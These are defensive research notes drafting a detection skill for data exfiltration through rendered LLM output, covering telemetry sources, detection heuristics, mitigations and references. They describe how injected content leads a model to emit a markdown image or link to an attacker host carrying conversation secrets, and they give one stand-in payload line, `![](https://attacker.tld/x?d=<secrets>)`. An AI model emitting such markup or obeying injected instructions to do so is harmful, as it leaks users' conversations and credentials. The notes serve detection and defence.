# Detecting LLM Output-Rendering Exfiltration — research notes

- **Proposed slug:** detecting-llm-output-rendering-exfiltration
- **ATLAS:** AML.T0077 LLM Response Rendering (tactic: Exfiltration) — the standalone row; closely downstream of AML.T0051 LLM Prompt Injection / AML.T0070 RAG Poisoning, which usually plant the instruction that produces the leaking output. Real case studies: AML.CS0021 (ChatGPT conversation exfiltration) and AML.CS0029 (Google Bard conversation exfiltration), both markdown-image exfiltration paths.
- **Status:** research (not yet a skill)

## Defensive goal
Detect data exfiltration that happens when a chat/agent UI **renders** attacker-influenced LLM output. The model is coaxed (via injected content) to emit a markdown image `![](https://attacker.tld/x?d=<secrets>)`, an HTML `<img>`/`<link>`/CSS `url()`, or a clickable/auto-previewed link whose path or query string carries conversation data, retrieved documents, tokens, or prior-turn secrets. When the client renders the markdown/HTML, the browser issues an outbound GET to the attacker host — **zero user clicks** for images, one click (or link-unfurl/preview) for links. This is the *rendering/egress* step, distinct from the injection that caused it.

## Data sources / telemetry
- **Rendered-output channel egress:** outbound HTTP(S) from the chat UI origin / client to external hosts triggered by image loads, link unfurls, favicon/CSS fetches. Browser `Content-Security-Policy` violation reports (`report-to`/`report-uri`), browser devtools/network logs, CDN/WAF/forward-proxy access logs showing the client fetching `*?<base64-ish data>` URLs.
- **LLM output text itself:** agent framework traces capturing the raw assistant message before render — LangSmith / Langfuse spans, OpenTelemetry GenAI spans (`gen_ai.completion`), application logs of model output. This is where you pattern-match the embedded image/link markup and encoded payloads.
- **Link-unfurl / preview services:** server-side URL preview fetchers (Slack/Teams/Discord-style unfurlers, email client image proxies) logging which URLs were resolved on behalf of a rendered message.
- **DNS logs:** resolution of newly-seen / low-reputation domains coincident with assistant turns.

## Detection logic / approach
1. **Scan model output pre-render** for image/link markup pointing at non-allowlisted hosts: markdown `![...](URL)`, HTML `<img src>`, `<a href>`, inline CSS `url(...)`, `<link>`, SVG with remote refs. Flag when the URL host is not on the app's render allowlist.
2. **Entropy / data-shape heuristic on the URL:** query string or path segment that is long, base64/hex/percent-encoded, or contains fragments matching known-sensitive patterns (email addresses, API-key prefixes, prior-message substrings). Correlate the encoded blob against the current conversation/context contents (near-duplicate = exfil).
3. **Egress correlation:** a client GET to an external host within milliseconds of an assistant turn, where that host was named in the turn's output, and the turn followed ingestion of untrusted content (web/RAG/email). DE.AE-03 style multi-source correlation (trace + proxy + DNS).
4. **Baseline:** legitimate UIs fetch images only from a small set of first-party/CDN hosts; a fetch to an arbitrary attacker domain is the anomaly.

## Response / mitigation
- **Prevent by construction (primary):** strict render-time **allowlist** for image/link hosts; disable auto-loading of remote images; route all external images through a sanitising proxy that strips query strings; apply a restrictive `img-src`/`connect-src`/`default-src` CSP on the chat surface. Anthropic/OpenAI and major chat vendors hardened exactly this after the Bard/ChatGPT cases.
- **Detect/respond:** alert on non-allowlisted render fetches; quarantine the conversation; rotate any credentials present in the leaked context; block the attacker domain at proxy/DNS; trace back to the injection source (RAG doc, web page, email) and purge it.
- Treat as RS.MI-01 containment: sever the egress path (CSP/proxy) before chasing attribution.

## Real tools
Langfuse / LangSmith / OpenTelemetry GenAI tracing (capture raw output), browser CSP reporting, forward proxy / SWG access logs (Zscaler-class, Squid), WAF/CDN logs, DNS resolver logs (passive DNS), content-render sanitisers (DOMPurify for HTML, markdown renderers with link/image allowlists), Microsoft Defender for Cloud Apps / email image-proxy logs. No single commercial "LLM render-exfil" product is standard yet — composed from tracing + egress telemetry.

## Draft frontmatter mappings
- atlas: [AML.T0077]
- nist_csf: [DE.CM-01, DE.AE-02, DE.AE-03, PR.PS-01, RS.MI-01]
- suggested subdomain: ai-security
- nearest existing sibling (negative trigger): detecting-indirect-prompt-injection

## Draft description (<=1024 chars)
Detects data exfiltration through rendered LLM output (ATLAS AML.T0077 LLM Response Rendering) — attacker-influenced model output embeds a markdown image, HTML img/link, CSS url(), or clickable link whose query string carries conversation data, retrieved docs, or tokens to an attacker host, leaking the moment the chat UI renders it (zero-click for images). Works by scanning raw output before render for image/link markup to non-allowlisted hosts, flagging high-entropy URL payloads that mirror current context, and correlating client egress (proxy, DNS, CSP reports) with the assistant turn. Use when investigating markdown-image exfiltration, zero-click chat data leaks, or suspicious outbound fetches from a chat surface after untrusted content was ingested. Keywords: AML.T0077, markdown image exfiltration, zero-click, CSP img-src, link unfurl, data egress, forward proxy logs. Do not use for the injection that plants the payload - use detecting-indirect-prompt-injection.

## Key references
- MITRE ATLAS AML.T0077 LLM Response Rendering (atlas.mitre.org) — verify current wording on the official page
- MITRE ATLAS case studies AML.CS0021 (ChatGPT) and AML.CS0029 (Google Bard) conversation exfiltration
- OWASP LLM Top 10: LLM02 (Sensitive Information Disclosure) and the "insecure output handling" lineage
- MDN / W3C Content Security Policy (img-src, connect-src) and CSP reporting
- Embrace The Red / Johann Rehberger write-ups on markdown-image LLM exfiltration (background, real technique)

## Open questions / scope boundaries
- Overlap boundary: the *cause* (indirect prompt injection) belongs to detecting-indirect-prompt-injection; this skill owns only the render/egress leak. Keep the brief focused on output markup + egress, not input filtering.
- False positives: legitimate UIs that render user-supplied markdown images; the allowlist/baseline is load-bearing. Author must specify a concrete first-party host baseline.
- Verify AML.CS0021 / AML.CS0029 IDs and whether AML.T0077 has sub-techniques in ATLAS v5.6.0 before citing in frontmatter.
- Server-side link unfurlers can leak even when the end client is hardened — scope must cover both client render and preview-service fetches.
